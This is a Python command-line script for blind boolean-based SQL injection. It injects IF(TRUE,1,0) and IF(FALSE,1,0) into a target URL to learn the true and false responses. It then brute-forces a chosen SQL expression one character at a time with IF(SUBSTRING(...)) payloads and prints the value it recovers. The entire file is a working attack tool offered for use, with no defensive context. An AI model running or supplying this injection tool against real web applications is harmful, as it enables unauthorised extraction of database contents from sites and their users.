import requests
import getopt
import sys
import string
import time
from bs4 import BeautifulSoup

def query_url(url, zero_resp, one_resp, parse):
    resp = requests.get(url).text
    if parse:
        resp = BeautifulSoup(resp, "html.parser").get_text()
    if resp == one_resp:
        return True
    elif resp == zero_resp:
        return False
    else:
        raise ValueError("Unexpected Value: %s" % (resp[:100] + "..."))
        return False


def main():
    verbose = False
    parse = False
    sleep = 0.1
    opts, args = getopt.getopt(sys.argv[1:], "hvps:")

    for o, a in opts:
        if o == "-h":
            print_help()
            exit()
        elif o == "-v":
            verbose = True
        elif o == "-p":
            parse = True
        elif o == "-s":
            try:
                sleep = float(a)
            except Exception as e:
                print(e)

    if verbose:
        print("Running in verbose mode...")
        print("Sleeping for %s seconds between requests..." % sleep)
        if parse:
            print("Using BeautifulSoup parser...")

    if len(args) != 2:
        print(args)
        print_help()
        exit()

    root_url, conditional = args

    try:

        zero_resp = requests.get(root_url + "IF(FALSE,1,0)").text
        one_resp = requests.get(root_url + "IF(TRUE,1,0)").text
        if parse:
            zero_resp = BeautifulSoup(zero_resp, "html.parser").get_text()
            one_resp = BeautifulSoup(one_resp, "html.parser").get_text()

        urlgen = lambda char, i: root_url + "IF(SUBSTRING(" + conditional + ",%d,1)=\"%s\",1,0)" % (i, char)
        value = ""
        substr_i = 1
        char_str = string.ascii_letters + string.digits
        char_str = open("charlist.txt").read()
        char_i = 0

        while char_i < len(char_str):
            char = char_str[char_i]
            if verbose:
                print("Trying %s at position %d" % (char, substr_i))
            if query_url(urlgen(char, substr_i), zero_resp, one_resp, parse):
                print("Character %d (1-indexed) is %s" % (substr_i, char))
                value += char
                substr_i += 1
                char_i = 0
            else:
                char_i += 1
            if sleep:
                time.sleep(sleep)
            # if char_i == len(char_str) and substr_i < 25:
            #     char_i = 0
        print("The value of %s on URL %s is %s" % (conditional, root_url, value))

    except Exception as e:
        print("Error loading site: %s" % e)
        exit()


def print_help():
    print(open("help.txt").read())


if __name__ == "__main__":
    main()